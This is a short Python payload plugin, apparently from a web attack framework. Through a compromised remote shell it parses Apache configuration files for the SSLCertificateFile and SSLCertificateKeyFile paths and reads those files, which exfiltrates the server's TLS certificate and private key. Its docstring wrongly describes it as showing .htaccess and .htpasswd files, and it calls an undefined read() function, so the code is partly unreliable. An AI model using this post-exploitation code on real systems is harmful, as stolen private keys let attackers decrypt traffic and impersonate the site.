import re
from plugins.attack.payloads.base_payload import base_payload

class apache_ssl(base_payload):
    '''
    This payload shows Apache distributed configuration files (.htaccess & .htpasswd)
    '''
    def run_read(self):
        result = []

        def parse_ssl_cert (apache_config):
            cert = re.search('(?<=SSLCertificateFile)(?! directive)    (.*)', apache_config)
            if cert:
                return cert.group(1)
            else:
                return ''

        def parse_ssl_key (apache_config):
            #key = re.search('(?<=SSLCertificateKeyFile )(.*?)\'', apache_config)
            key = re.search('(?<=SSLCertificateKeyFile )(.*)', apache_config)
            if key:
                return key.group(1)
            else:
                return ''


        apache_files = self.exec_payload('apache_config_files')
        for file in apache_files:
            if parse_ssl_cert(self.shell.read(file)) != '':
                result.append(read(parse_ssl_cert(self.shell.read(file))))
            if parse_ssl_key(self.shell.read(file)) != '':
                result.append(read(parse_ssl_key(self.shell.read(file))))
        
        return result
